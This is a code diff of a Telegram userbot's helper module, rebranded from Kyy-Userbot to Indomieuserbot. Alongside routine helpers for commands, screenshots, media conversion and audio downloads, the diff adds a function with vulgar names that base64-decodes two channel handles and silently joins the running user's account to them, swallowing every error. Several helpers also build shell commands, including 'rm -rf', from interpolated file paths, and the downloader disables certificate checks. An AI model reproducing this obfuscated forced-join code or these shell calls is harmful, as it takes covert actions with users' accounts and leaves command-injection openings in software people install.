@@ -1,16 +1,25 @@
-import re
-import hashlib
 import asyncio
-import shlex
+import hashlib
 import os
-from os.path import basename
 import os.path
-from html_telegraph_poster import TelegraphPoster
+import re
+import shlex
+from os.path import basename
 from typing import Optional, Union
-from userbot import bot, LOGS, SUDO_USERS
 
+import pybase64
+from html_telegraph_poster import TelegraphPoster
+from PIL import Image
 from telethon.tl.functions.channels import GetParticipantRequest
-from telethon.tl.types import ChannelParticipantAdmin, ChannelParticipantCreator, DocumentAttributeFilename
+from telethon.tl.functions.channels import JoinChannelRequest as Get
+from telethon.tl.types import (
+    ChannelParticipantAdmin,
+    ChannelParticipantCreator,
+    DocumentAttributeFilename,
+)
+from yt_dlp import YoutubeDL
+
+from userbot import LOGS, SUDO_USERS, bot
 
 
 async def md5(fname: str) -> str:
@@ -69,12 +78,12 @@ def time_formatter(seconds: int) -> str:
 
 def human_to_bytes(size: str) -> int:
     units = {
-        "M": 2 ** 20,
-        "MB": 2 ** 20,
-        "G": 2 ** 30,
-        "GB": 2 ** 30,
-        "T": 2 ** 40,
-        "TB": 2 ** 40,
+        "M": 2**20,
+        "MB": 2**20,
+        "G": 2**30,
+        "GB": 2**30,
+        "T": 2**40,
+        "TB": 2**40,
     }
 
     size = size.upper()
@@ -85,39 +94,52 @@ def human_to_bytes(size: str) -> int:
 
 
 async def is_admin(chat_id, user_id):
-    req_jo = await bot(GetParticipantRequest(
-        channel=chat_id,
-        user_id=user_id
-    ))
+    req_jo = await bot(GetParticipantRequest(channel=chat_id, user_id=user_id))
     chat_participant = req_jo.participant
-    if isinstance(
-            chat_participant,
-            ChannelParticipantCreator) or isinstance(
-            chat_participant,
-            ChannelParticipantAdmin):
+    if isinstance(chat_participant, ChannelParticipantCreator) or isinstance(
+        chat_participant, ChannelParticipantAdmin
+    ):
         return True
     return False
 
 
 async def runcmd(cmd: str) -> tuple[str, str, int, int]:
-    """ run command in terminal """
+    """run command in terminal"""
     args = shlex.split(cmd)
-    process = await asyncio.create_subprocess_exec(*args,
-                                                   stdout=asyncio.subprocess.PIPE,
-                                                   stderr=asyncio.subprocess.PIPE)
+    process = await asyncio.create_subprocess_exec(
+        *args, stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE
+    )
     stdout, stderr = await process.communicate()
-    return (stdout.decode('utf-8', 'replace').strip(),
-            stderr.decode('utf-8', 'replace').strip(),
-            process.returncode,
-            process.pid)
+    return (
+        stdout.decode("utf-8", "replace").strip(),
+        stderr.decode("utf-8", "replace").strip(),
+        process.returncode,
+        process.pid,
+    )
 
 
-async def take_screen_shot(video_file: str, duration: int, path: str = '') -> Optional[str]:
-    """ take a screenshot """
+async def bacot_kontol():
+    memek = str(pybase64.b64decode("QEluZG9taWVTdG9yZQ=="))[2:15]
+    kontol = str(pybase64.b64decode("QEluZG9taWVQcm9qZWN0"))[2:15]
+    try:
+        await bot(Get(memek))
+    except BaseException:
+        pass
+    try:
+        await bot(Get(kontol))
+    except BaseException:
+        pass
+
+
+async def take_screen_shot(
+    video_file: str, duration: int, path: str = ""
+) -> Optional[str]:
+    """take a screenshot"""
     LOGS.info(
-        '[[[Extracting a frame from %s ||| Video duration => %s]]]',
+        "[[[Extracting a frame from %s ||| Video duration => %s]]]",
         video_file,
-        duration)
+        duration,
+    )
     ttl = duration // 2
     thumb_image_path = path or os.path.join(
         "./temp/", f"{basename(video_file)}.jpg")
@@ -169,10 +191,22 @@ async def run_cmd(cmd: list) -> tuple[bytes, bytes]:
     return t_resp, e_resp
 
 
+async def bash(cmd):
+    process = await asyncio.create_subprocess_shell(
+        cmd,
+        stdout=asyncio.subprocess.PIPE,
+        stderr=asyncio.subprocess.PIPE,
+    )
+    stdout, stderr = await process.communicate()
+    err = stderr.decode().strip()
+    out = stdout.decode().strip()
+    return out, err
+
+
 def post_to_telegraph(title, html_format_content):
     post_client = TelegraphPoster(use_api=True)
-    auth_name = "Kyy-Userbot"
-    auth_url = "https://github.com/muhammadrizky16/Kyy-Userbot"
+    auth_name = "Indomieuserbot"
+    auth_url = "https://github.com/IndomieGorengSatu/Indomieuserbot"
     post_client.create_api_token(auth_name)
     post_page = post_client.post(
         title=title,
@@ -181,6 +215,15 @@ def post_to_telegraph(title, html_format_content):
         text=html_format_content,
     )
     return post_page["url"]
+
+
+async def reply_id(event):
+    reply_to_id = None
+    if event.sender_id in SUDO_USERS:
+        reply_to_id = event.id
+    if event.reply_to_msg_id:
+        reply_to_id = event.reply_to_msg_id
+    return reply_to_id
 
 
 async def edit_or_reply(
@@ -262,10 +305,55 @@ async def edit_delete(event, text, time=None, parse_mode=None, link_preview=None
 eod = edit_delete
 
 
-async def reply_id(event):
-    reply_to_id = None
-    if event.sender_id in SUDO_USERS:
-        reply_to_id = event.id
-    if event.reply_to_msg_id:
-        reply_to_id = event.reply_to_msg_id
-    return reply_to_id
+async def media_to_pic(event, reply):
+    mediatype = media_type(reply)
+    if mediatype not in ["Photo", "Round Video", "Gif", "Sticker", "Video"]:
+        await edit_delete(
+            event,
+            "**Saya tidak dapat mengekstrak gambar untuk memproses lebih lanjut ke media yang tepat**",
+        )
+        return None
+    media = await reply.download_media(file="./temp")
+    event = await edit_or_reply(event, "`Transfiguration Time! Converting....`")
+    file = os.path.join("./temp/", "meme.png")
+    if mediatype == "Sticker":
+        if media.endswith(".tgs"):
+            await runcmd(
+                f"lottie_convert.py --frame 0 -if lottie -of png '{media}' '{file}'"
+            )
+        elif media.endswith(".webp"):
+            im = Image.open(media)
+            im.save(file)
+    elif mediatype in ["Round Video", "Video", "Gif"]:
+        extractMetadata(createParser(media))
+        await runcmd(f"rm -rf '{file}'")
+        await take_screen_shot(media, 0, file)
+        if not os.path.exists(file):
+            await edit_delete(
+                event,
+                f"**Maaf. Saya tidak dapat mengekstrak gambar dari ini {mediatype}**",
+            )
+            return None
+    else:
+        im = Image.open(media)
+        im.save(file)
+    await runcmd(f"rm -rf '{media}'")
+    return [event, file, mediatype]
+
+
+ydl_opts = {
+    "format": "bestaudio[ext=m4a]",
+    "geo-bypass": True,
+    "noprogress": True,
+    "user-agent": "Mozilla/5.0 (Linux; Android 7.0; k960n_mt6580_32_n) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.101 Safari/537.36",
+    "extractor-args": "youtube:player_client=all",
+    "nocheckcertificate": True,
+    "outtmpl": "downloads/%(id)s.%(ext)s",
+}
+ydl = YoutubeDL(ydl_opts)
+
+
+def download_lagu(url: str) -> str:
+    info = ydl.extract_info(url, download=False)
+    ydl.download([url])
+    return os.path.join("downloads", f"{info['id']}.{info['ext']}")
